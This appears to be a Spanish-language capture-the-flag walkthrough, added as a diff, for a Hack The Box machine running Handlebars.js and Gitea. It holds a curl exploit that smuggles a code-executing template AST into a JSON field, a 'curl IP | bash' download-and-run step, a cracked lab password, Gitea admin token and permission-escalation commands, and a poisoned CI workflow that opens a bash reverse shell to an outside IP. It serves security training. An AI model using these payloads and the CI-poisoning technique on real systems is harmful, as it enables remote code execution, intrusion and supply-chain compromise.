@@ -1,0 +1,71 @@
+* Esta maquina renderiza con Handlebars.js el cual es Vulnerable a RCE (CVE-2026-33940 )
++++++++ exp.sh +++++++
+curl -X POST http://dzcampaigns.htb/character/<Crea un Character> \
+  -H "Content-Type: application/json" \
+  -H "Cookie: dz.sid=< Buscalo en burpsuite>" \
+  -H "X-CSRF-Token: <Buscala en burpsuite>" \
+  -d '{
+    "name":"asdf",
+    "race":"asdfadsf",
+    "class":"asdf",
+    "backstory":"a",
+    "campaign_id":1,
+    "campaign_message":{
+      "call":true,
+      "type":"Program",
+      "body":[{
+        "type":"MustacheStatement",
+        "depth":0,
+        "path":{
+          "type":"PathExpression",
+          "parts":["pop"],
+          "original":"this.pop",
+          "depth":"0])),function(){return process.mainModule.require(\"child_process\").execSync(\"id\").toString();}()));//"
+        }
+      }]
+    }
+  }'
+++++ eof +++++
+
+* ejecuta esto para obtener un RevShell node (Recuerda reemplzar los datos por los tuyos)
+
+* la infalible curl IP | bash
+
+* Investiga el .env encontraras credenciales
+
+* investiga users en la DB te dara un hash. se rompe con john y te da la contraseña Rangers1
+
+* Usala en el ssh
+
+* enumerando la maquina vas a encontrar una instancia de GITEA usa chisel o tunel SSH para acceder a ella Vulnerable
+
+* parece que GITEA es vulnerable a RCE con el cve https://github.com/0xBlackash/CVE-2026-60004
+
+* Una vez que ganes la revshell utiliza la app de gitea.exe para generar un token maestro
+  - ./gitea admin user generate-access-token --username root --token-name htb-pwn --scopes all
+
+* Despues date permisos de escritura en repo darkzero que viste en la enumeracion de GIT
+
+  - curl -X PUT "http://localhost:3000/api/v1/repos/darkzero/darkzero-campaigns/collaborators/bc" -H "Authorization: token <Token-Obtenido>" -H "Content-Type: application/json" -d '{"permission": "write"}'
+
+* una vez con permisos haz git clone al repositorio. modifica el .gitea/workflows/main.yml para que te lanze una rev
+
++++++ la modificacion se tiene que ver algo como ++++++
+
+# TODO : Add Tests & Deployment
+name: CI
+on: [push, pull_request]
+jobs:
+  ci:
+    runs-on: ubuntu
+    steps:
+      - run: bash -c 'bash -i >& /dev/tcp/10.10.14.193/4444 0>&1'
+
++++++ eof
+
+* pon NC a escuchar
+
+* crea una nueva rama y sublea. Usa la nueva rama para crear un PUll request ya que esto dispara el CI 
+
+? (Creo que que tambien se ejecuta con pushes a ramas. pero no se)
+
